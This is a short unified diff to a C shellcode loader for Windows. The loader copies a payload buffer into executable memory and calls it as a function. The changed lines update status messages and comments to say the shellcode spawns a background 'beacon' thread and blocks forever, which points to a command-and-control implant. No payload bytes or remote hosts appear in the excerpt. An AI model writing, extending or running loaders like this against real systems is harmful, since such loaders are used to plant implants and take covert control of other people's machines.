@@ -75,14 +75,17 @@ int main(int argc, char **argv) {
     memcpy(exec_mem, buf, (size_t)sz);
     free(buf);
 
-    printf("[*] Executing shellcode...\n\n");
+    printf("[*] Executing shellcode...\n");
+    printf("[*] Shellcode will block this thread (beacon runs in background).\n");
+    printf("[*] Press Ctrl+C to exit.\n\n");
 
-    /* Execute as a function */
+    /* Execute — the PIC stub blocks forever after spawning the beacon thread */
     typedef void (*shellcode_fn)(void);
     shellcode_fn run = (shellcode_fn)exec_mem;
     run();
 
-    printf("\n[*] Shellcode returned\n");
+    /* Should never reach here — stub loops internally */
+    printf("\n[!] Shellcode returned unexpectedly\n");
     VirtualFree(exec_mem, 0, MEM_RELEASE);
     return 0;
 }
